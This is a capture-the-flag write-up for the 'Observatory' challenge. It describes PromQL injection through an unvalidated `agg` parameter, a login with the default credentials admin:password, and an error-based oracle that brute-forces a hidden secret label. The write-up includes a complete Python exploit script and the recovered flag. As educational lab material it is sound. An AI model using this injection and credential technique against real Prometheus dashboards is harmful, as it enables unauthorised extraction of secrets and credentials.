---
title: "Hacktheon Sejong 2026 Quals Observatory Writeup"
description: "Hacktheon Sejong 2026 Quals Observatory writeup"
---

# Observatory

### Summary

In the dashboard's Prometheus query API, the `agg` parameter mattered more than `metric`. Since the server assembles PromQL in the form `agg(metric{namespace=...})`, I put an expression into `agg` and read the hidden `secret_config` label through an error oracle.

### Analysis

In `/api/metrics` you can see metric names like `secret_config`, `internal_token`, and `db_credentials`. However, reading them directly via the `metric` parameter processed them relative to the current namespace, so the original label/value did not come out.

In the UI, `agg` only takes values like `sum`, `avg`, `max`, but the API accepts the string as-is. The server builds the PromQL as below.

```text
{agg}({metric}{namespace="current namespace"})
```

If you put an expression into `agg` and end it with `or sum`, you can make the trailing `(...metric...)` part be consumed as a fallback function call.

Since the output is hidden, I built an error oracle. If `secret_config{flag=~"^PREFIX.*"}` does not match, it is an empty vector so the query succeeds. If it matches, I deliberately trigger a many-to-one vector matching to cause a query error.

The oracle was set up like this.

```text
sum(secret_config{flag=~"^PREFIX.*"})
+ on()
sum by(__name__)({__name__=~"go_.*"})
or sum
```

The response criteria are as follows.

```text
Query failed -> prefix match
success      -> prefix miss
```

After finding the default account `admin:password`, I brute-forced the flag label one character at a time with this oracle.

### Exploit

```python
import re
import requests

base = "http://43.201.43.169:3000"

s = requests.Session()
s.post(
    base + "/login",
    data={"username": "admin", "password": "password"},
    allow_redirects=False,
    timeout=5,
)


def prom_quote_regex(rx: str) -> str:
    return rx.replace("\\", "\\\\").replace('"', '\\"')


def oracle_regex(rx: str) -> bool:
    q = prom_quote_regex(rx)
    agg = (
        f'sum(secret_config{{flag=~"{q}"}}) '
        f'+ on() '
        f'sum by(__name__)({{__name__=~"go_.*"}}) '
        f'or sum'
    )

    r = s.post(
        base + "/api/query",
        json={"metric": "up", "agg": agg},
        timeout=5,
    )
    d = r.json()
    return d.get("status") == "error" and d.get("message") == "Query failed"


alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_:-./@!$%&*+=,?[]()<>#"
prefix = ""

for _ in range(120):
    for ch in alphabet:
        candidate = prefix + ch
        if oracle_regex("^" + re.escape(candidate) + ".*"):
            prefix = candidate
            print(prefix)
            break
    else:
        break

    if prefix.endswith("}"):
        break

print("FLAG:", prefix)
```

### Flag

`hacktheon2026{pr0m3th3us_m3tr1c_s1d3ch4nn3l}`
